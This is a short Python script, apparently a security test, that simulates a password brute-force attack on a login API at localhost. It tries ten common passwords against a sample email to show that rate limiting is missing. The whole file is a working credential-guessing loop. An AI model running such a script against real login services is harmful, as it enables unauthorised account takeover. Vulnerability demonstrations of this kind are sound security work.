#!/usr/bin/env python3
"""
Security Test: Brute Force Attack Simulation
This demonstrates the lack of rate limiting on the login endpoint
"""

import requests
import time
from itertools import product

# Common passwords for brute force
common_passwords = [
    'password', 'password123', 'admin', 'admin123', '123456', 
    'qwerty', 'letmein', 'welcome', 'monkey', 'dragon'
]

# Known email from source code
target_email = 'user@example.com'
login_url = 'http://localhost:3000/api/auth/login'

def attempt_login(email, password):
    """Attempt login with given credentials"""
    try:
        response = requests.post(login_url, 
            json={'email': email, 'password': password},
            timeout=5
        )
        return response.status_code, response.text
    except Exception as e:
        return None, str(e)

def brute_force_attack():
    """Simulate brute force attack"""
    print(f"Starting brute force attack on {target_email}")
    print(f"Target URL: {login_url}")
    
    for i, password in enumerate(common_passwords):
        print(f"Attempt {i+1}: {target_email} / {password}")
        
        status, response = attempt_login(target_email, password)
        
        if status == 200:
            print(f"SUCCESS! Valid credentials found: {target_email} / {password}")
            break
        elif status == 401:
            print(f"  Failed: Invalid credentials")
        else:
            print(f"  Error: {status} - {response}")
        
        # No rate limiting means we can attack as fast as we want
        # In a real attack, this would be much faster
        time.sleep(0.1)

if __name__ == "__main__":
    brute_force_attack()
